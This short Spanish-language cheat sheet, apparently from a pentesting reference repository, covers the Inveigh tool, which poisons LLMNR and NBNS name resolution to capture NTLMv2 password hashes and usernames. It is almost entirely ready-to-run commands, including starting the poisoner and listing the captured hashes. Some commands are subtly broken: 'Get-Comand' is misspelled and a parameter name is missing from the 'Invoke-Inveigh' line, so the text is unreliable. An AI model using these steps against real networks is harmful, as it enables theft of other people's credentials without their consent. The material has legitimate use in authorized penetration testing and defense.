# Inveigh Cheat Sheet

#### Importar y visualizar los parámetros del aplicativo
```
Import-Module .\Inveigh.ps1
(Get-Comand Invoke-Inveigh).Parameters
```

#### Ejecutar para recibir solicitudes LLMNR y NBNS
```
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

#### Ejecutar la versión .EXE
```
.\Inveigh.exe
```

##### OPCIONES para el ejecutble (.EXE):

- Presionar `ESC` mientras se ejecuta Inveigh.exe y luego teclear `HELP`para ver las opciones
- Para visualizar los Hashes NTLMv2 capturados, dar la opción: `GET NTLMV2UNIQUE`
- Para visualizar usuarios capturados, dar la opción: `GET NTLMV2USERNAMES`
- Para salir de las opciones y continuar la captura de paquetes, dar la opción: `RESUME`
- Para detener la captura de paquetes, dar la opción: `STOP`


---

[:arrow_left: Regresar](https://github.com/m4lal0/cheatsheets)